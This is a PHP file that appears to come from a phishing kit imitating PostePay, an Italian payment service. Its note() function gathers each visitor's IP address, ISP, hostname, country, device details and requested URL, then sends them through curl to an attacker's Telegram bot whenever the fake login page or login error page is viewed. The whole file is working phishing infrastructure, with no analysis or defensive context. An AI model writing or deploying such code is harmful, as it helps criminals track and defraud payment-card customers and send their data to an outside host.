<?php 
require '../CONFIGS/CONFIG.0.php';
include "../CONFIGS/GET.IP.INFOS.php";

function note($statu){
	global $bot_token;
	global $chat_id;
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=html&text=".urlencode($LOGS="<b>[ ".$_SESSION['_LOOKUP_CNTRCODE_']." ] •••••••••• 🍺.❌ [ POSTEPAY.CLIENT ] 🍺.❌</b>\n[ 🔎 - 🔌 ] *  :  [ ".$_SERVER['REMOTE_ADDR']." ] - [ ".$_SESSION['_LOOKUP_ISP_']." ]\n[ 🖥 ] *  :  [ ".$_SESSION['_HOST_']." ]\n[ 🚩 ] *  :  [ ".$_SESSION['_LOOKUP_COUNTRY_']." ] - [ ".$_SESSION['_LOOKUP_CNTRCODE_']." ]\n[ 💻 - 🌐 ] *  :  [ ".$_SESSION['_device_details_']." ]\n[ 🔗 ] *  :  [ ".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']." ]\n[ 📆 ] *  :  [ ".date('d-m-Y')." ] - [ ".$_SESSION['_date_format_']." ]\n[ ⚙️ ] *  :  [ $statu ]"));
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	$res =  curl_exec($c);
	curl_close($c);
	
}


if(isset($_POST['firstpageview'])){
	note("👑.❌ AT LOGIN.X PAGE");
}if(isset($_POST['firstpageerrorview'])){
	note("👑.❌ AT LOGIN.X ERROR PAGE");
}
?>